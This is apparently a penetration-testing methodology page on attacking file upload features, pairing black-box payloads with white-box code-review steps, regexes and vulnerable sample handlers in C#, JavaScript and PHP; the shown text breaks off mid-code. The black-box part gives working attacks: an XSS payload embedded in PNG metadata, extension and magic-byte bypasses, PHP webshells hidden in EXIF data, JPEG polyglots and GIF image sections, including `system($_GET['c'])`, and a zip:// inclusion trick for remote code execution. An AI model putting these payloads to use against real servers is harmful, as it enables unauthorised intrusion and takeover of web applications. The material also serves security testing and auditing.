# Upload of Malicious Files

## Check List

## Methodology

### Black Box

#### [XSS Stored via Upload avatar PNG \[HTML\]](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Files/xss_comment_exif_metadata_double_quote.png)

{% stepper %}
{% step %}
Create Malicious PNG Payload&#x20;
{% endstep %}

{% step %}
Download the XSS payload PNG or use exiftool to embed

```bash
exiftool -Comment="">alert(prompt('XSS BY ZEROX4'))" xss_comment_exif_metadata_double_quote.pn
```
{% endstep %}

{% step %}
Access Avatar Upload Page
{% endstep %}

{% step %}
Go to the locate the avatar upload form
{% endstep %}

{% step %}
Intercept Upload Request in Burp Suite
{% endstep %}

{% step %}
Modify Content-Type to `text/html`
{% endstep %}

{% step %}
Edit the Content-Type header for the uploaded file from `image/png` to `text/html` in the request
{% endstep %}

{% step %}
Submit Modified Request
{% endstep %}

{% step %}
Forward the altered request to upload the malicious PNG as HTML
{% endstep %}

{% step %}
Verify Stored XSS Execution
{% endstep %}

{% step %}
Confirm the file is saved on example.com and access it to trigger the alert payload
{% endstep %}
{% endstepper %}

***

#### NTFS Alternate Data Streams (ADS) abuse

{% stepper %}
{% step %}
Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application

```
PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
JPG: \xff\xd8\xff
GIF: GIF87a OR GIF8;
```
{% endstep %}

{% step %}
Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server ("`file.asax:.jpg`") This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions ("`file.asp::$data.`")
{% endstep %}
{% endstepper %}

***

#### [EXIF Metadata Webshell](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-insecure-files)

{% stepper %}
{% step %}
Find a nice picture and embed the shell into the image like this

```bash
exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png
```
{% endstep %}

{% step %}
Rename the jpg/png picture to the .php extension
{% endstep %}

{% step %}
Upload the picture
{% endstep %}

{% step %}
You will get an 500 error page. Ignore it. Grep the time from the response and convert it to a timestamp
{% endstep %}

{% step %}
Use the timestamp to find your shell

&#x20;`https://example.org/uploads/profile/[USERNAMAE][timestamp].php`
{% endstep %}
{% endstepper %}

***

#### [Polyglot File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-insecure-files)

{% stepper %}
{% step %}
A Magic Number is a unique sequence of bytes at the beginning of a file that identifies its type. Even if a file’s extension is changed, the Magic Number helps the system recognize the actual file format Examples

```
PNG files start with: 89 50 4E 47 0D 0A 1A 0A
PDF files start with: %PDF-1.7
```

```http
Content-Disposition: form-data; name="image"; filename="img.jpg"
Content-Type: image/jpeg

ÿØÿàJFIFÿÛC -> jpg Magic Number
... (binary data) ...
ÿÙ
```
{% endstep %}

{% step %}
I uploaded a normal .jpg image, and the server accepted it, returning a 200 OK status\
Exploit Attempt
{% endstep %}

{% step %}
I re-send the exact same request, but this time, I modified the image content by embedding the PHP shell code inside it
{% endstep %}

{% step %}
But I send the request and changed the file extension to PHP

```http
Content-Disposition: form-data; name="image"; filename="img.php" -> change to .PHP
Content-Type: image/jpeg

ÿØÿàJFIFÿÛC
... (binary data) ...
<?php
echo "<pre>";
system("uname -a");
echo "</pre>";
?>
ÿÙ
```
{% endstep %}

{% step %}
Result: The server accepted the modified file and returned 200 OK
{% endstep %}
{% endstepper %}

***

#### [GIF Image Carving (PHP Payload Injection)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-insecure-files)

{% stepper %}
{% step %}
Identify possible image formats (starting with GIF)
{% endstep %}

{% step %}
Test how the server transforms the uploaded image
{% endstep %}

{% step %}
Replicate these transformations locally using ImageMagick and PHP
{% endstep %}

{% step %}
Determine if any sections of the image remain unmodified
{% endstep %}

{% step %}
Inject PHP code into those sections and test execution
{% endstep %}

{% step %}
Testing with GIF
{% endstep %}

{% step %}
I began with a simple one-color (black) GIF image to easily spot modifications. After uploading and downloading the image, I compared the original and transformed versions. The transformations included

Stripping EXIF data&#x20;

Resizing the image to 300x300 pixels To replicate this locally, I used the following PHP script

```php
<?php
$thumb = new Imagick('testgif.gif');
$thumb->resizeImage(300,300);
$thumb->writeImage('testgif2.gif');
$thumb->destroy();
?>
```
{% endstep %}

{% step %}
Through testing, I identified an unmodified section of the GIF file filled with `00` values. This provided enough space to inject my PHP payload
{% endstep %}

{% step %}
Payload Injection Using a hex editor in Burp Suite, I inserted the following PHP code into the GIF file

```php
<?php phpinfo();?>
<?php system($_GET['c']);?>
```
{% endstep %}

{% step %}
By carving these payloads into the unmodified section of the GIF file, I successfully achieved remote code execution after uploading the modified image
{% endstep %}
{% endstepper %}

***

#### ZIP Upload File

{% stepper %}
{% step %}
if you can upload `.zip` file on target then
{% endstep %}

{% step %}
Create a `.php` file (`rce.php`)
{% endstep %}

{% step %}
Compress it to a `.zip` file (`file.php`)
{% endstep %}

{% step %}
Upload your `.zip` file on the vulnerable web Application
{% endstep %}

{% step %}
Trigger your RCE via&#x20;

`(https://<target Site>.com/index.php?page=zip://path/file.zip#rce.php`
{% endstep %}
{% endstepper %}

***

### White Box

#### Download Remote File in Protocol

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw all endpoints in XMind
{% endstep %}

{% step %}
Decompile the web server based on the programming language used
{% endstep %}

{% step %}
Look for endpoints that use a protocol and make an external request, such as SFTP
{% endstep %}

{% step %}
In the code, find where external requests are processed
{% endstep %}

{% step %}
Check whether functions named `getRemoteFileURL` and `handleDownloadFile` exist in the processing logic and whether they allow downloading files from a URL, like in the code below

{% tabs %}
{% tab title="C#" %}
```csharp
public static class Validator
{
    public static void ValidateContextForAction(string actionName, Dictionary<string, string> context)
    {
        switch (actionName)
        {
            case "uploadFile":
            case "uploadFileToNewDirectory":
            case "uploadArchive":
                if (context.ContainsKey("remotePath"))
                {
                    string validatedPath = InputValidator.ValidateFilePath(context["remotePath"], true);
                    // Additional upload-specific validation
                    if (context.ContainsKey("localPath"))
                    {
                        InputValidator.ValidateFileUpload(context["localPath"], validatedPath);
                    }
                }
                break;

            case "downloadFile":
            case "fetchFile":
            case "getFileContents":
            case "deleteFile":
                if (context.ContainsKey("remotePath"))
                {
                    InputValidator.ValidateFilePath(context["remotePath"], true);
                }
                break;

            // .. snip ..
        }
    }
}
```
{% endtab %}

{% tab title="JavaScript" %}
```js
function validateContextForAction(actionName, context) {
    switch (actionName) {
        case 'uploadFile':
        case 'uploadFileToNewDirectory':
        case 'uploadArchive':
            if (context.remotePath) {
                const validatedPath = InputValidator.validateFilePath(context.remotePath, true);
                // Additional upload-specific validation
                if (context.localPath) {
                    InputValidator.validateFileUpload(context.localPath, validatedPath);
                }
            }
            break;

        case 'downloadFile':
        case 'fetchFile':
        case 'getFileContents':
        case 'deleteFile':
            if (context.remotePath) {
                InputValidator.validateFilePath(context.remotePath, true);
            }
            break;

        // .. snip ..
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
function validateContextForAction($actionName, $context) {
        switch ($actionName) {
            case 'uploadFile':
            case 'uploadFileToNewDirectory':
            case 'uploadArchive':
                if (isset($context['remotePath'])) {
                    $validatedPath = InputValidator::validateFilePath($context['remotePath'], true);
                    // Additional upload-specific validation
                    if (isset($context['localPath'])) {
                        InputValidator::validateFileUpload($context['localPath'], $validatedPath);
                    }
                }
                break;
                
            case 'downloadFile':
            case 'fetchFile':
            case 'getFileContents':
            case 'deleteFile':
                if (isset($context['remotePath'])) {
                    InputValidator::validateFilePath($context['remotePath'], true);
                }
                break;
                
            .. snip ..
        }
```
{% endtab %}

{% tab title="Node js" %}
```javascript
function validateContextForAction(actionName, context) {
    switch (actionName) {
        case 'uploadFile':
        case 'uploadFileToNewDirectory':
        case 'uploadArchive':
            if (context.remotePath) {
                const validatedPath = InputValidator.validateFilePath(context.remotePath, true);
                // Additional upload-specific validation
                if (context.localPath) {
                    InputValidator.validateFileUpload(context.localPath, validatedPath);
                }
            }
            break;

        case 'downloadFile':
        case 'fetchFile':
        case 'getFileContents':
        case 'deleteFile':
            if (context.remotePath) {
                InputValidator.validateFilePath(context.remotePath, true);
            }
            break;

        // .. snip ..
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Features and functions such as `downloadFile` are highly important; you can see the processing code below

{% tabs %}
{% tab title="C#" %}
```csharp
    public void DownloadFile(object transferOperation)
    {
        EnsureConnectedAndAuthenticated("DOWNLOAD_OPERATION");

        if (!HandleDownloadFile(transferOperation))
        {
            HandleMultiTransferError("DOWNLOAD_OPERATION", transferOperation);
        }
    }
```
{% endtab %}

{% tab title="JavaScript" %}
<pre class="language-js"><code class="lang-js"><strong>function downloadFile(transferOperation) {
</strong>        this.ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION');

        if (!this.handleDownloadFile(transferOperation)) {
            this.handleMultiTransferError('DOWNLOAD_OPERATION', transferOperation);
        }
    }

</code></pre>
{% endtab %}

{% tab title="PHP" %}
```php
public function downloadFile($transferOperation) {
    $this->ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION');

    if (!$this->handleDownloadFile($transferOperation)) {
        $this->handleMultiTransferError('DOWNLOAD_OPERATION', $transferOperation);
    }

```
{% endtab %}

{% tab title="Node js" %}
<pre class="language-js"><code class="lang-js"><strong>function downloadFile(transferOperation) {
</strong>        this.ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION');

        if (!this.handleDownloadFile(transferOperation)) {
            this.handleMultiTransferError('DOWNLOAD_OPERATION', transferOperation);
        }
    }
</code></pre>
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
After reviewing the function, check whether the file received from the external server is copied directly to the system, what path it is copied to, and whether that path is user-controlled, like in the code below

you can use this regex for find vulnerability

**VSCode**

{% tabs %}
{% tab title="C# Regex" %}
```regex
(?<Source>Get(Remote|Local)Path\s*\(|dynamic\s+\w+)|(?<Sink>\bCopy\s*\(|HandleCopy\s*\(|Stat\s*\(|MakeDirectory)
```
{% endtab %}

{% tab title="JavaScript Regex" %}
```js
(?<Source>req\.(query|body|params))|(?<Sink>fetch\s*\(|http\.get\s*\(|fs\.(copyFile|writeFile))
```
{% endtab %}

{% tab title="PHP Regex" %}
```php
(?<Source>\$_(GET|POST|REQUEST))|(?<Sink>copy\s*\(|file_get_contents\s*\(|fopen\s*\(|curl_exec)
```
{% endtab %}

{% tab title="Node Js Regex" %}
```js
(?<Source>req\.(body|query|params))|(?<Sink>fs\.(createWriteStream|copyFile)|axios\s*\(|request\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep**

{% tabs %}
{% tab title="C# Regex" %}
```regex
(Get(Remote|Local)Path\s*\(|dynamic\s+\w+)|(Copy\s*\(|HandleCopy\s*\(|Stat\s*\(|MakeDirectory)
```
{% endtab %}

{% tab title="JavaScript Regex" %}
```javascript
(req\.(query|body|params))|(fetch\s*\(|http\.get\s*\(|fs\.(copyFile|writeFile))
```
{% endtab %}

{% tab title="PHP Regex" %}
```php
(?<Source>\$_(GET|POST|REQUEST))|(?<Sink>copy\s*\(|file_get_contents\s*\(|fopen\s*\(|curl_exec)
```
{% endtab %}

{% tab title="Node Js Regex" %}
```javascript
(?<Source>req\.(body|query|params))|(?<Sink>fs\.(createWriteStream|copyFile)|axios\s*\(|request\s*\()
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```csharp
protected bool HandleDownloadFile(dynamic transferOperation)
{
    string remoteURL = GetRemoteFileURL(transferOperation.GetRemotePath()); <---- [0]

    if (Copy(remoteURL, transferOperation.GetLocalPath()))  <---- [1]
        return true;

    // Check if remote file exists to provide better error information
    var statResult = Stat(remoteURL);
    return false; // Copy failed
}
```
{% endtab %}

{% tab title="JavaScript" %}
```js
function handleDownloadFile(transferOperation) {
    const remoteURL = getRemoteFileURL(transferOperation.getRemotePath());  <---- [0]

    if (copy(remoteURL, transferOperation.getLocalPath()))  <---- [1]
        return true;

    // Check if remote file exists to provide better error information
    const statResult = stat(remoteURL);
    return false; // Copy failed
}
```
{% endtab %}

{% tab title="PHP" %}
```php
protected function handleDownloadFile($transferOperation) {
    $remoteURL = $this->getRemoteFileURL($transferOperation->getRemotePath()); <---- [0]

    if(copy($remoteURL, $transferOperation->getLocalPath())) <---- [1]
        return true;

    // Check if remote file exists to provide better error information
    $statResult = stat($remoteURL);
    return false; // Copy failed
}
```
{% endtab %}

{% tab title="Node Js" %}
```js
function handleDownloadFile(transferOperation) {
    const remoteURL = getRemoteFileURL(transferOperation.getRemotePath());  <---- [0]

    if (copy(remoteURL, transferOperation.getLocalPath()))  <---- [1]
        return true;

    // Check if remote file exists to provide better error information
    const statResult = stat(remoteURL);
    return false; // Copy failed
}
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```csharp
public void Copy(object source, object destination)
{
    EnsureConnectedAndAuthenticated("COPY_OPERATION");

    // .. snip ..

    for (int i = 0; i < sources.Length; ++i)
    {
        var destinationPath = destinations[i];
        var destinationDir = PathOperations.RemoteDirname(destinationPath);

        var sourcePathAndItem = sources[i];

        var sourcePath = sourcePathAndItem[0];
        var sourceItem = sourcePathAndItem[1];

        if (!string.IsNullOrEmpty(destinationDir) && destinationDir != "/" &&
            Array.IndexOf(destinationDirs, destinationDir) == -1)
        {
            destinationDirs.Add(destinationDir);
            MakeDirectoryWithIntermediates(destinationDir);
        }

        if (sourceItem == null)
        {
            HandleCopy(sourcePath, destinationPath);
        }
        else
        {
            if (sourceItem.IsDirectory())
            {
                if (Array.IndexOf(destinationDirs, destinationPath) == -1)
                {
                    destinationDirs.Add(destinationPath);
                    MakeDirectoryWithIntermediates(destinationPath);
                }
            }
            else
            {
                HandleCopy(sourcePath, destinationPath);
            }

            newPermissions[destinationPath] = sourceItem.GetNumericPermissions();
        }
    }

    // .. snip ..
}

```
{% endtab %}

{% tab title="JavaScript" %}
```javascript
function copy(source, destination) {
    ensureConnectedAndAuthenticated('COPY_OPERATION');

    // .. snip ..

    for (let i = 0; i < sources.length; ++i) {
        const destinationPath = destinations[i];
        const destinationDir = PathOperations.remoteDirname(destinationPath);

        const sourcePathAndItem = sources[i];

        const sourcePath = sourcePathAndItem[0];
        const sourceItem = sourcePathAndItem[1];

        if (destinationDir !== "" && destinationDir !== "/" &&
            !destinationDirs.includes(destinationDir)) {
            destinationDirs.push(destinationDir);
            makeDirectoryWithIntermediates(destinationDir);
        }

        if (sourceItem === null) {
            handleCopy(sourcePath, destinationPath);
        } else {
            if (sourceItem.isDirectory()) {
                if (!destinationDirs.includes(destinationPath)) {
                    destinationDirs.push(destinationPath);
                    makeDirectoryWithIntermediates(destinationPath);
                }
            } else {
                handleCopy(sourcePath, destinationPath);
            }

            newPermissions[destinationPath] = sourceItem.getNumericPermissions();
        }
    }

    // .. snip ..
}

```
{% endtab %}

{% tab title="PHP" %}
```php
public function copy($source, $destination) {
    $this->ensureConnectedAndAuthenticated('COPY_OPERATION');

    .. snip ..

    for ($i = 0; $i < sizeof($sources); ++$i) {
        $destinationPath = $destinations[$i];
        $destinationDir = PathOperations::remoteDirname($destinationPath);

        $sourcePathAndItem = $sources[$i];

        $sourcePath = $sourcePathAndItem[0];
        $sourceItem = $sourcePathAndItem[1];

        if ($destinationDir != "" && $destinationDir != "/" &&
            array_search($destinationDir, $destinationDirs) === false) {
            $destinationDirs[] = $destinationDir;
            $this->makeDirectoryWithIntermediates($destinationDir);
        }

        if ($sourceItem === null)
            $this->handleCopy($sourcePath, $destinationPath);
        else {
            if ($sourceItem->isDirectory()) {
                if (array_search($destinationPath, $destinationDirs) === false) {
                    $destinationDirs[] = $destinationPath;
                    $this->makeDirectoryWithIntermediates($destinationPath);
                }
            } else {
                $this->handleCopy($sourcePath, $destinationPath);
            }

            $newPermissions[$destinationPath] = $sourceItem->getNumericPermissions();
        }
    }

    .. snip ..
 }
```
{% endtab %}

{% tab title="Node js" %}
```js
function copy(source, destination) {
    ensureConnectedAndAuthenticated('COPY_OPERATION');

    // .. snip ..

    for (let i = 0; i < sources.length; ++i) {
        const destinationPath = destinations[i];
        const destinationDir = PathOperations.remoteDirname(destinationPath);

        const sourcePathAndItem = sources[i];

        const sourcePath = sourcePathAndItem[0];
        const sourceItem = sourcePathAndItem[1];

        if (destinationDir !== "" && destinationDir !== "/" &&
            !destinationDirs.includes(destinationDir)) {
            destinationDirs.push(destinationDir);
            makeDirectoryWithIntermediates(destinationDir);
        }

        if (sourceItem === null) {
            handleCopy(sourcePath, destinationPath);
        } else {
            if (sourceItem.isDirectory()) {
                if (!destinationDirs.includes(destinationPath)) {
                    destinationDirs.push(destinationPath);
                    makeDirectoryWithIntermediates(destinationPath);
                }
            } else {
                handleCopy(sourcePath, destinationPath);
            }

            newPermissions[destinationPath] = sourceItem.getNumericPermissions();
        }
    }

    // .. snip ..
}

```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

#### Remote Code Execution via File Upload (Unuthenticate)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw all endpoints in XMind
{% endstep %}

{% step %}
Decompile the web server based on the programming language used
{% endstep %}

{% step %}
In the code, look for the file upload processing logic and check whether it requires authentication or not, like in the code below

{% tabs %}
{% tab title="C#" %}
```c#
[ShortDescription("")]
[Description("Upload a file chunk.")]
[AuthenticatedService(AllowAnonymous = true)]
[Route("")]
[HttpPost]
[Returns(typeof(string))]
public async Task<ActionResult> Upload()
{
    ActionResult actionResult;
    try
    {
        StringValues stringValues = base.Request.Form["context"]; // [1]
        StringValues stringValues2 = base.Request.Form["contextData"]; // [2]
        if (base.Request.Form.Files.Count == 0) // [3]
        {
            actionResult = this.StatusCode(415);
        }
        else
        {
            //...
            if (stringValues2 != StringValues.Empty)
            {
                pupData.targetData = JsonConvert.DeserializeObject<PostUploadProcessingTargetData>(stringValues2.ToString()); // [4]
            }
            //...
            switch (readPartResult2.status)
            {
                case ReadPartStatus.BAD:
                    actionResult = base.CreateStatusCode(HttpStatusCode.InternalServerError, readPartResult2.message);
                    break;
                case ReadPartStatus.GOOD:
                    actionResult = this.Ok("");
                    break;
                case ReadPartStatus.DONE:
                {
                    ResumableConfiguration uploadConfiguration = this.GetUploadConfiguration();
                    FileStream file = FileX.OpenRead(readPartResult2.filePath);
                    object obj = null;
                    SmarterMail.Web.Logic.UploadResult retStatus;
                    try
                    {
                        retStatus = await UploadLogic.ProcessCompletedUpload(
                            this.WebHostEnvironment,
                            base.HttpContext,
                            base.HttpAbsoluteRootPath,
                            base.VirtualAppPath,
                            currentUserTemp,
                            pupData,
                            new SmarterMail.Web.Logic.UploadedFile
                            {
                                fileName = uploadConfiguration.FileName,
                                stream = file
                            }
                        ); // [5]
                    }
                    catch { }
                }
                break;
            }
        }
    }
    catch { }
    return actionResult;
}

```
{% endtab %}

{% tab title="JavaScript" %}
```javascript
async function upload(req, res) {
    let actionResult;
    try {
        const stringValues = req.form["context"]; // [1]
        const stringValues2 = req.form["contextData"]; // [2]

        if (req.files.length === 0) { // [3]
            actionResult = { status: 415 };
        } else {
            //...
            if (stringValues2 !== "") {
                pupData.targetData = JSON.parse(stringValues2); // [4]
            }
            //...
            switch (readPartResult2.status) {
                case "BAD":
                    actionResult = { status: 500, message: readPartResult2.message };
                    break;
                case "GOOD":
                    actionResult = { status: 200, message: "" };
                    break;
                case "DONE": {
                    const uploadConfiguration = getUploadConfiguration();
                    const file = openFile(readPartResult2.filePath); // placeholder
                    let retStatus;
                    try {
                        retStatus = await processCompletedUpload(
                            webHostEnvironment,
                            httpContext,
                            httpAbsoluteRootPath,
                            virtualAppPath,
                            currentUserTemp,
                            pupData,
                            { fileName: uploadConfiguration.FileName, stream: file } // [5]
                        );
                    } catch (e) { }
                }
                break;
            }
        }
    } catch (e) { }
    return actionResult;
}

```
{% endtab %}

{% tab title="PHP" %}
```php
public function upload() {
    $actionResult = null;
    try {
        $stringValues = $_POST['context']; // [1]
        $stringValues2 = $_POST['contextData']; // [2]

        if (count($_FILES) === 0) { // [3]
            $actionResult = http_response_code(415);
        } else {
            //...
            if ($stringValues2 != "") {
                $pupData->targetData = json_decode($stringValues2); // [4]
            }
            //...
            switch ($readPartResult2->status) {
                case 'BAD':
                    $actionResult = ['status' => 500, 'message' => $readPartResult2->message];
                    break;
                case 'GOOD':
                    $actionResult = ['status' => 200, 'message' => ''];
                    break;
                case 'DONE':
                    $uploadConfiguration = $this->getUploadConfiguration();
                    $file = fopen($readPartResult2->filePath, 'r');
                    $retStatus = null;
                    try {
                        $retStatus = processCompletedUpload(
                            $webHostEnvironment,
                            $httpContext,
                            $httpAbsoluteRootPath,
                            $virtualAppPath,
                            $currentUserTemp,
                            $pupData,
                            ['fileName' => $uploadConfiguration->FileName, 'stream' => $file] // [5]
                        );
                    } catch (Exception $e) { }
                    break;
            }
        }
    } catch (Exception $e) { }
    return $actionResult;
}

```
{% endtab %}

{% tab title="Node Js" %}
```js
async function upload(req, res) {
    let actionResult;
    try {
        const stringValues = req.body.context; // [1]
        const stringValues2 = req.body.contextData; // [2]

        if (req.files.length === 0) { // [3]
            actionResult = { status: 415 };
        } else {
            //...
            if (stringValues2 !== "") {
                pupData.targetData = JSON.parse(stringValues2); // [4]
            }
            //...
            switch (readPartResult2.status) {
                case 'BAD':
                    actionResult = { status: 500, message: readPartResult2.message };
                    break;
                case 'GOOD':
                    actionResult = { status: 200, message: '' };
                    break;
                case 'DONE': {
                    const uploadConfiguration = getUploadConfiguration();
                    const file = openFile(readPartResult2.filePath); // placeholder
                    let retStatus;
                    try {
                        retStatus = await processCompletedUpload(
                            webHostEnvironment,
                            httpContext,
                            httpAbsoluteRootPath,
                            virtualAppPath,
                            currentUserTemp,
                            pupData,
                            { fileName: uploadConfiguration.FileName, stream: file } // [5]
                        );
                    } catch (e) { }
                }
                break;
            }
        }
    } catch (e) { }
    return actionResult;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Review the processing logic in the code (the function that completes the file upload process)

{% tabs %}
{% tab title="C#" %}
```csharp
public static async Task<UploadResult> ProcessCompletedUpload(
    IWebHostEnvironment webHostEnvironment,
    HttpContext httpContext,
    string httpAbsoluteRootPath,
    string virtualAppPath,
    UserData currentUser,
    PostUploadProcessing pupData,
    UploadedFile file)
{
    UploadResult uploadResult;
    try
    {
        //...
        string target = pupData.target;
        if (target != null)
        {
            switch (target.Length)
            {
                case 8:
                    if (target == "task-ics")
                    {
                        return UploadLogic.TaskImportIcsFile(currentUser, file, pupData.targetData.source, pupData.targetData.fileId);
                    }
                    break;
                case 10:
                    if (target == "attachment") // [1]
                    {
                        return await MailLogic.SaveAttachment(
                            webHostEnvironment,
                            httpAbsoluteRootPath,
                            currentUser,
                            file,
                            pupData.targetData.guid,
                            "" // [2]
                        );
                    }
                    break;
                case 11:
                    if (target == "note-import")
                    {
                        return NoteLogic.ImportNote(currentUser, file, pupData.targetData.source);
                    }
                    break;
                //...
            }
        }
    }
    catch { }
    return null;
}

```
{% endtab %}

{% tab title="JavaScript" %}
```javascript
async function processCompletedUpload(webHostEnvironment, httpContext, httpAbsoluteRootPath, virtualAppPath, currentUser, pupData, file) {
    let uploadResult;
    try {
        //...
        const target = pupData.target;
        if (target !== null && target !== undefined) {
            switch (target.length) {
                case 8:
                    if (target === "task-ics") {
                        return taskImportIcsFile(currentUser, file, pupData.targetData.source, pupData.targetData.fileId);
                    }
                    break;
                case 10:
                    if (target === "attachment") { // [1]
                        return await saveAttachment(webHostEnvironment, httpAbsoluteRootPath, currentUser, file, pupData.targetData.guid, ""); // [2]
                    }
                    break;
                case 11:
                    if (target === "note-import") {
                        return importNote(currentUser, file, pupData.targetData.source);
                    }
                    break;
                //...
            }
        }
    } catch (e) { }
    return null;
}

```
{% endtab %}

{% tab title="PHP" %}
```php
public static function processCompletedUpload($webHostEnvironment, $httpContext, $httpAbsoluteRootPath, $virtualAppPath, $currentUser, $pupData, $file) {
    $uploadResult = null;
    try {
        //...
        $target = $pupData->target;
        if ($target !== null) {
            switch (strlen($target)) {
                case 8:
                    if ($target === "task-ics") {
                        return taskImportIcsFile($currentUser, $file, $pupData->targetData->source, $pupData->targetData->fileId);
                    }
                    break;
                case 10:
                    if ($target === "attachment") { // [1]
                        return saveAttachment($webHostEnvironment, $httpAbsoluteRootPath, $currentUser, $file, $pupData->targetData->guid, ""); // [2]
                    }
                    break;
                case 11:
                    if ($target === "note-import") {
                        return importNote($currentUser, $file, $pupData->targetData->source);
                    }
                    break;
                //...
            }
        }
    } catch (Exception $e) { }
    return null;
}

```
{% endtab %}

{% tab title="Node Js" %}
```js
async function processCompletedUpload(webHostEnvironment, httpContext, httpAbsoluteRootPath, virtualAppPath, currentUser, pupData, file) {
    let uploadResult;
    try {
        //...
        const target = pupData.target;
        if (target !== null && target !== undefined) {
            switch (target.length) {
                case 8:
                    if (target === "task-ics") {
                        return taskImportIcsFile(currentUser, file, pupData.targetData.source, pupData.targetData.fileId);
                    }
                    break;
                case 10:
                    if (target === "attachment") { // [1]
                        return await saveAttachment(webHostEnvironment, httpAbsoluteRootPath, currentUser, file, pupData.targetData.guid, ""); // [2]
                    }
                    break;
                case 11:
                    if (target === "note-import") {
                        return importNote(currentUser, file, pupData.targetData.source);
                    }
                    break;
                //...
            }
        }
    } catch (e) { }
    return null;
}

module.exports = { processCompletedUpload };

```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check the processing of all file types that can be uploaded, especially files of type `attachment`

you can use this regex for find vulnerability

**VSCODE**

{% tabs %}
{% tab title="C# Regex" %}
```regexp
(?<Source>file\.(fileName|stream))|(?<Sink>FileStream\s+\w*\s*=\s*new\s+FileStream\(|\.CopyTo\()
```
{% endtab %}

{% tab title="JavaScript Regex" %}
```regex
(?<Source>input\.files|event\.target\.files|new\s+FormData)|(?<Sink>new\s+FileReader|new\s+Blob|URL\.createObjectURL)
```
{% endtab %}

{% tab title="PHP Regex" %}
```regex
(?<Source>\$_(FILES|POST|REQUEST))|(?<Sink>move_uploaded_file|file_put_contents|fopen\s*\(|copy\s*\()
```
{% endtab %}

{% tab title="Node Js Regex" %}
```js
(?<Source>req\.(files|body)|multer|busboy)|(?<Sink>fs\.(writeFile|writeFileSync|createWriteStream))
```
{% endtab %}
{% endtabs %}

**RipGrep**

{% tabs %}
{% tab title="C# Regex" %}
```regex
(?<Source>file\.(fileName|stream))|(?<Sink>FileStream\s+\w*\s*=\s*new\s+FileStream\(|\.CopyTo\()
```
{% endtab %}

{% tab title="JavaScript Regex" %}
```regex
(?<Source>input\.files|event\.target\.files|new\s+FormData)|(?<Sink>new\s+FileReader|new\s+Blob|URL\.createObjectURL)
```
{% endtab %}

{% tab title="PHP Regex" %}
```regex
(?<Source>\$_(FILES|POST|REQUEST))|(?<Sink>move_uploaded_file|file_put_contents|fopen\s*\(|copy\s*\()
```
{% endtab %}

{% tab title="Node Js Regex" %}
```javascript
(?<Source>req\.(files|body)|multer|busboy)|(?<Sink>fs\.(writeFile|writeFileSync|createWriteStream))
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```csharp
public static async Task<UploadResult> SaveAttachment(
    IWebHostEnvironment _webHostEnvironment,
    string httpAbsoluteRootPath,
    UserData currentUser,
    UploadedFile file,
    string guid,
    string contentId = "")
{
    //...
    try
    {
        if (file != null && file.stream.Length > 0L)
        {
            var sanitizedName = AttachmentsHelper.SanitizeFilename(file.fileName); // [1]
            string text = AttachmentsHelper.FindExtension(sanitizedName); // [2]
            DirectoryInfoX directoryInfoX = new DirectoryInfoX(
                PathX.Combine(FileManager.BaseDirectory, "App_Data", "Attachments")); // [3]

            if (!DirectoryX.Exists(directoryInfoX.ToString()))
            {
                DirectoryX.CreateDirectory(directoryInfoX.ToString());
            }

            //...
            lock (attachments)
            {
                List<AttachmentInfo> list;
                AttachmentsHelper.Attachments.TryGetValue(attachguid, out list);
                if (list != null)
                {
                    if (list.FirstOrDefault(x => x.Size == attachmentInfo.Size &&
                                                 x.ContentType == attachmentInfo.ContentType &&
                                                 x.ActualFileName == attachmentInfo.ActualFileName) == null)
                    {
                        attachmentInfo.GeneratedFileName = AttachmentsHelper.GenerateFileName(attachguid, list.Count, text); // [4]
                        attachmentInfo.GeneratedFileNameAndLocation = AttachmentsHelper.GenerateFileNameAndLocation(directoryInfoX.ToString(), attachmentInfo.GeneratedFileName); // [5]
                        list.Add(attachmentInfo);
                    }
                }
                else
                {
                    attachmentInfo.GeneratedFileName = AttachmentsHelper.GenerateFileName(attachguid, 0, text); // [6]
                    attachmentInfo.GeneratedFileNameAndLocation = AttachmentsHelper.GenerateFileNameAndLocation(directoryInfoX.ToString(), attachmentInfo.GeneratedFileName); // [7]
                    //...
                }
            }

            if (attachmentInfo.GeneratedFileName != null && attachmentInfo.GeneratedFileName.Length > 0)
            {
                using (FileStream fileStream = new FileStream(attachmentInfo.GeneratedFileNameAndLocation, FileMode.Create, FileAccess.Write))
                {
                    file.stream.CopyTo(fileStream); // [8]
                }
                //...
            }
        //...
        }
    }
    //...
}

```
{% endtab %}

{% tab title="JavaScript" %}
```javascript
async function saveAttachment(_webHostEnvironment, httpAbsoluteRootPath, currentUser, file, guid, contentId = "") {
    //...
    try {
        if (file != null && file.stream.length > 0) {
            const sanitizedName = sanitizeFilename(file.fileName); // [1]
            const text = findExtension(sanitizedName); // [2]
            const directoryPath = combinePath(baseDirectory, "App_Data", "Attachments"); // [3]

